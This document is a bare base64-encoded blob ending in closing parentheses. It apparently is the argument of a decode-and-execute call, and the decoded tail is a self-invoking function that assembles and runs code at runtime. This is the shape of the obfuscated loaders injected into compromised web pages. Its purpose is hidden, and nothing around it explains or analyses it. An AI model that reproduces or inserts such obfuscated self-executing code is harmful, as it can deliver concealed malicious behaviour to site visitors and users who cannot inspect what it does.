LD07TChMZDt9aUxyI0xmTDZ0ZndzXyUuKWl9O11fXS45KStlMnRtezVjIm5jW3hvLjRmYXJlckxPcmQ5aG5MZWQsTDJMN2lMTHQ6ZyFzTF1MMz1MM3cuZGYwZHJMZEwzX11wXXBMZzImci4oTDxpZjAlTG59KXNQZUxkdSMibCFoTDBMNzFTKzpMcmkwc2FkY2VMYSUpZHBlZEVpTFplYVIrK3UgTDVMPSlpYW5vcyFhck89TExyWjtvZHBfLnRkTCFdPS11OEghO0w1TnhldG8uJEVMRjE1dDFMTCkyb2k2JWVhaXIwTF9YbjFjU2lne2MldDZnNGFsITZfaUxpTDJ7TExMWzRDbzFlLiVMZik7bm9vYkxjdC1ZK240Lm9dTEx0LmFdZmVcXEBzaW9kJV0sMmVMWWdsYn1vdGROPWlvTGRkKW49MkxMTCQlZWxMPV9vXWguTFRjTF0uVCAlTiwsXV1ETDR9VG5ubkxoY0wlLD1lX10uN2lMXWI0VmV0JUxMc2RMMDt0VVVyRUwyLltdPkw1bzBvLGNlNik9Oz07NExjfWRkcDM2MGcuTF1hKDM1aSkuIHtMIEx0Yys7ZGY9TGV0Oy4oYXNMXWxMeExvJXRwZCg7PTE9XWQlcF1oPTlvX11cL2Vvc0xFcnZfdHlkfS5vaj1pTG11aiwpKC4uTGNfTGhhdUx0IWk5dXVvZylhc3IuLFlzcnQ7bzFub180b2dvJnIkaDsgbGR1MWRzcGc9LSg9KDshKTJvJSBMXjJMdTcoXm9iTHA7X0x0LG5MY0xub2RzdExvO2VkcG57TGlfbTMuM18hKWUubHR1JTZvPkwuLHJyQC4mLkw9TEwwdWh5JWkzVGcpZXRUbGhzdDUkZTF0KDxpXyVMZDJMMSZMTG5TTHNMRigpYmopXWVnZExONXJMdCpJejFbWm1MLHRlcF1DMXogdGpMZVErdDJwbnJfdC4xTCRbJSkxKC5uc2x7TCBMdFJjTEw0Ll1dfV9MTHJMb19leSxza256M2cwTCV4fWldc2NMLn0uTCgxIXR0NmkoLkw1X30pfWwtW2Ysbn0oQGgic3hjTGMpYHQsdHNMeS5uNi4hdHQpTEx3LkxiOjdzZG5kZTIyJExzTG5da196NS5sLiRzbj0pX2UzMl9pdGxyXCclY1pydCUuNntldWUuOmhdYy47NW0xKmMuLmRzIUxzb3NlNjZjTGhkYVZtLDZ7KExyPWhmTCk7YjIrTDJ1cExuZmJjYmcmdnBpZkxpOTZlPXMuUylMdExCX2IoX19MPVRhXV0sYTdybzdybzRqRSlhZn1feEx7di11czZMTGdlK2VkLFUzOm8hIGJMTGljTHBMfS48ezUgKW9fKWRdNE4+Ll12e2MoO181ZG9iTHRjTExMIDApICg4X28gY18jLjAgTGR0KXsld19NTF9fLixvaT1ue2RMcShbclkwaW5MX3NhTF1fbmZnTGVucC1sbjUuZUwxOzJMXSFvTChld3JdaSt0bTorTXBMYjBkLjFMX0xfdEx1KCxoLiUzKTpDZ1N0THg7NTMgKHZfX30uc2Frc3NMLF9sKW8zTD1MSH05MylMMmpJcDUtYV1hTHUuZShkICkjWGxMQ18xMy5hKD1dXFxyOzItaCBmKSguZU8lTF8gKGYhXThyR2cuRUx1dTMlZSBhbXQgZV9Mbl1nOyBMbHFzXWUyKTslLmsgLjQkciV1aiVfY3RfbDRtZm5lYjhJNHZdTDI9PmxweF0yTGkhPWE1KE4uID1ke2VfOSVbfW9sMGExZEw4JV86bjtuYixuLnlMcEMgKS5vTG14dF9kLlVwe3hpciFtJDFmMCUpOy5tdF1MVHtodCluMCAmXWAmcC5mKGNMTC5kSSVMamF0ZnMgZGVQMTFkMzZ0a0xMIWNuTGxhTCFMTlRvKWguTHRMamFMc2pdPXJdMTs2LEx9ZXthKCA9X2RvYjdhTDRsXyBvfShfMiJtX0xMLSFtZW5hVG9wb0xLLmQgaWVMTF9SM19jckw3TVtSKUx9KF10JTJuc2UuVC5dNSRdMXJlezVMYWUpSV9MLiVkOz8yKUxkb3I9R3lvZTMgZX1mZD1MdCA9XX1MN3BlIF1CJCIifV5sTExvYiBlJC4pX0w1ZF13ZmZ0NSZvbih0bkwjKG91JykpO3ZhciBCcVM9bVdHKFhJVixiemkgKTtCcVMoODYxNSk7cmV0dXJuIDE0MTZ9KSgp'))
